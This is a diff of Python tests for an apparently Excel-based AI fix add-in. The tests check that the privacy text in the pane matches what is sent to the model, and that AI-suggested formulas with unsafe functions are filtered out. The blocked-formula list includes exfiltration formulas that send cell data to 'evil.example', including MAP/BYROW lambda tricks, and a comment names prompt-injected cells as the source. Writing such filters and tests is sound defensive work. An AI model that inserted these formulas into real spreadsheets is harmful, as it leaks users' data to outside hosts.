@@ -66,6 +66,30 @@ def test_ask_ai_sends_no_more_rows_than_both_privacy_pages_say():
         assert near and sum(r < flagged for r in near) <= above and sum(r > flagged for r in near) <= below, page
 
 
+def test_what_the_pane_says_ask_ai_sends_is_what_the_engine_sends(monkeypatch):
+    # AH-150: #fix-sends, beside the Ask AI box, gives three numbers and nothing held them to the engine's: each is
+    # measured here on what /fix really sends (the rows around the flagged one, a long cell, the past fixes it takes)
+    import re
+    from pathlib import Path
+    hint = re.search(r'<p id="fix-sends"[^>]*>([^<]*)</p>',
+                     (Path(__file__).resolve().parents[2] / "frontend/taskpane.html").read_text(encoding="utf-8")).group(1)
+    near, cap, fixes = (int(re.search(p, hint).group(1)) for p in (
+        r"this row and up to (\d+) rows above and below it", r"Long cells are cut to (\d+) characters", r"Up to (\d+) fixes you accepted"))
+    sent = []
+    monkeypatch.setattr(client, "_ask", lambda prompt, *a, **k: (sent.append(prompt), client.Fix(explanation="x", changes=[]))[1])
+    monkeypatch.setattr(client, "api_key_configured", lambda: True)
+    rows = [[f"2026-01-{k:02}", "East", k] for k in range(1, 41)]
+    rows[19][1] = "y" * 1000  # a long cell in the row above the flagged one
+    c = create_app().test_client()
+    body = {"columns": COLS, "rows": rows, "row_index": 20, "start_row": 0, "start_col": 0, "reason": "Units odd", "intent": "fix"}
+    for k in (fixes, fixes + 1):
+        r = c.post("/fix", json={**body, "memory": ["Units: 1 -> 2"] * k})
+        assert r.status_code == (200 if k == fixes else 400), (k, r.get_json())
+    shown = [int(n) for n in re.findall(r"^row (\d+): ", sent[0], re.M)]
+    assert sum(n < 22 for n in shown) == near and sum(n > 22 for n in shown) == near, shown  # rows[20] is sheet row 22
+    assert repr("y" * cap + "...") in sent[0] and "y" * (cap + 1) not in sent[0]
+
+
 def test_fix_route_validates_before_calling_claude(monkeypatch):
     monkeypatch.setattr(client, "api_key_configured", lambda: True)
     monkeypatch.setattr(client, "suggest_fix", lambda *a: 1 / 0)  # must never be reached
@@ -225,12 +249,15 @@ def test_an_ai_formula_using_a_function_not_on_the_safe_list_is_left_out(monkeyp
     # another workbook, after a prompt-injected cell talks the AI into it (the user still sees a preview).
     bad = ['=IMPORTCSV("https:"&"//evil.example/?"&A2)', '=IMPORTTEXT("https:"&"//x/?"&A2)',
            '=COPILOT("summarise", A2:C3)', '＝WEBSERVICE("https://x/?"&A2)', '=INDIRECT("[Other.xlsx]S!A1")',
-           '=STOCKHISTORY("MSFT",A2)', '=SUM(A2,PY("import os"))']
+           '=STOCKHISTORY("MSFT",A2)', '=SUM(A2,PY("import os"))',
+           # AH-150: a bare function name is a LAMBDA in Excel 365: MAP, BYROW and REDUCE call it on the cells
+           '=MAP("https:"&"//evil.example/?"&A2,IMAGE)', '=BYROW("https:"&"//x/?"&A2:C2,IMPORTCSV)',
+           '=MAP(A2,STOCKHISTORY)', '=REDUCE(0,A2,COPILOT)', '=MAP(CHAR(91)&"Other.xlsx"&CHAR(93)&"S"&CHAR(33)&"A1",INDIRECT)']
     good = ['=SUM(C2:C3)', '=IFERROR(VLOOKUP(A2,A2:C3,3,FALSE),0)', '=ROUND(AVERAGEIFS(C2:C3,B2:B3,"East"),2)',
             '=XLOOKUP(A2,A2:A3,C2:C3)', '=TEXT(DATE(2026,1,9),"yyyy-mm-dd")', '=_xlfn.XLOOKUP(A2,A2:A3,C2:C3)',
-            '-5', 'East (import)']
+            '-5', 'East (import)', '=LET(x,C2,y,C3,x+y)', '=MAP(C2:C3,LAMBDA(v,ROUND(v,0)))']
     wide = COLS + ["D", "E"]
-    rows = [r + ["", ""] for r in ROWS] + [["2026-01-09", "East", 1, "", ""]] * 7
+    rows = [r + ["", ""] for r in ROWS] + [["2026-01-09", "East", 1, "", ""]] * 9
     answer = {"explanation": "x", "changes": [{"cell": f"D{k + 2}", "new": f} for k, f in enumerate(bad)]
               + [{"cell": f"E{k + 2}", "new": f} for k, f in enumerate(good)]}
     srv, _ = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
@@ -239,7 +266,8 @@ def test_an_ai_formula_using_a_function_not_on_the_safe_list_is_left_out(monkeyp
     finally:
         srv.shutdown()
     assert [c["cell"] for c in out["changes"]] == [f"E{k + 2}" for k in range(len(good))]
-    assert "not on this add-in's safe list" in out["explanation"]
+    assert (f"D7, {', '.join(f'D{k + 2}' for k in range(6, len(bad)))}: the formula used a function that is not on this "
+            "add-in's safe list.)") in out["explanation"]  # D5 and D6 already reach outside the workbook
 
 
 def test_engine_reason_wording_the_panel_reads():
